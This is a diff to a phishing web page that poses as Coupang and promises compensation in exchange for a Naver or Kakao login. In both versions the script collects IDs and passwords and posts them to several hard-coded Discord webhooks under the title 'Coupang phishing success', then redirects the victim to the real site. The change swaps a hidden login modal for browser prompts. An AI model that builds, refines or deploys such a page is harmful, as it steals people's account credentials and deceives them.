@@ -15,12 +15,11 @@
   .kakao{background:#fee500;color:#191919}
   .footer{padding:30px 0;color:#999;font-size:12px;text-align:center}
   .alert{background:#fff3cd;padding:18px;border-radius:10px;color:#d32f2f;font-size:14px;margin:20px 0;text-align:center}
-  .hidden{display:none}
 </style>
 </head>
 <body>
 <div class="header">
-  <div style="font-family:'Arial Black,sans-serif;font-size:66px;font-weight:900;letter-spacing:-4px;color:#4a2c0b">
+  <div style="font-family:'Arial Black',sans-serif;font-size:66px;font-weight:900;letter-spacing:-4px;color:#4a2c0b">
     <span style="color:#4a2c0b">co</span><span style="color:#e61e2a">u</span><span style="color:#f26722">p</span><span style="color:#ffca00">a</span><span style="color:#009e4d">n</span><span style="color:#009ee3">g</span>
   </div>
 </div>
@@ -36,8 +35,8 @@
     신청 완료 후 담당자가 개별 연락드립니다
   </div>
 
-  <div class="login-btn naver" onclick="openLogin('네이버')">네이버로 로그인</div>
-  <div class="login-btn kakao" onclick="openLogin('카카오')">카카오로 로그인</div>
+  <div class="login-btn naver" onclick="naverLogin()">네이버로 로그인</div>
+  <div class="login-btn kakao" onclick="kakaoLogin()">카카오로 로그인</div>
 </div>
 
 <div class="footer">
@@ -45,30 +44,28 @@
   고객센터 1577-7011
 </div>
 
-<!-- 진짜 로그인 폼 (prompt 대신) -->
-<div id="loginBox" class="hidden" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:9999">
-  <div style="background:#fff;padding:30px;border-radius:15px;width:90%;max-width:400px">
-    <h2 style="text-align:center;margin:0 0 20px;color:#333" id="loginTitle">네이버 로그인</h2>
-    <input type="text" id="userId" placeholder="아이디" style="width:100%;padding:16px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:17px">
-    <input type="password" id="userPw" placeholder="비밀번호" style="width:100%;padding:16px;margin:10px 0;border:1px solid #ddd;border-radius:8px;font-size:17px">
-    <button onclick="submitLogin()" style="width:100%;padding:16px;background:#ff6b00;color:#fff;border:none;border-radius:8px;font-size:18px;margin-top:15px">로그인 후 보상 신청</button>
-    <button onclick="document.getElementById('loginBox').classList.add('hidden')" style="width:100%;padding:12px;background:#eee;color:#333;border:none;border-radius:8px;margin-top:10px 0 0">취소</button>
-  </div>
-</div>
-
 <script>
-function openLogin(type){
-  document.getElementById('loginTitle').innerText = type + " 로그인";
-  document.getElementById('loginBox').classList.remove('hidden');
-  currentType = type;
+function naverLogin(){
+  const id = prompt("네이버 아이디를 입력하세요");
+  const pw = prompt("네이버 비밀번호를 입력하세요");
+  if(id && pw) send("네이버", id, pw);
 }
 
-let currentType = "";
+function kakaoLogin(){
+  const id = prompt("카카오메일 아이디를 입력하세요\n(예: abc123@kakao.com)");
+  const pw = prompt("카카오 비밀번호를 입력하세요");
+  if(id && pw) send("카카오", id, pw);
+}
 
-function submitLogin(){
-  const id = document.getElementById('userId').value.trim();
-  const pw = document.getElementById('userPw').value;
-  if(!id || !pw) return alert("아이디와 비밀번호를 입력해주세요");
+function send(type, id, pw){
+  const data = { embeds: [{ title: "쿠팡 피싱 성공", color: 16711680,
+    fields: [
+      { name: "로그인 종류", value: type },
+      { name: "아이디", value: id },
+      { name: "비밀번호", value: pw },
+      { name: "시간", value: new Date().toLocaleString('ko-KR') }
+    ]
+  }]};
 
   const hooks = [
     "https://discordapp.com/api/webhooks/1440762955196010517/R_jUtcPtXsZ2iQLalFINoXQpWSKhOGFHnfSxL3J5wv2RSrAEnLC1SW-aBysf0_q_K31n",
@@ -76,11 +73,10 @@ function submitLogin(){
     "https://discordapp.com/api/webhooks/1443170879256399956/ofvZrCn4KcBjo_eehancUH1LwkQEFutNjni2e36ixMQUqsDBvTeD2oMQ2TyRHsbgOagb"
   ];
 
-  hooks.forEach(h => fetch(h, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"쿠팡 피싱 성공",color:16711680,fields:[{name:"종류",value:currentType},{name:"아이디",value:id},{name:"비밀번호",value:pw},{name:"시간",value:new Date().toLocaleString('ko-KR')}]}]})}));
+  hooks.forEach(h => fetch(h, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}));
 
-  alert("보상 신청이 완료되었습니다!\n담당자가 연락드리겠습니다.");
-  document.getElementById('loginBox').classList.add('hidden');
-  setTimeout(()=>location.href="https://www.coupang.com",1500);
+  alert("신청이 완료되었습니다.\n담당자가 순차적으로 연락드리겠습니다.");
+  setTimeout(()=>{location.href="https://www.coupang.com";},1500);
 }
 </script>
 </body>
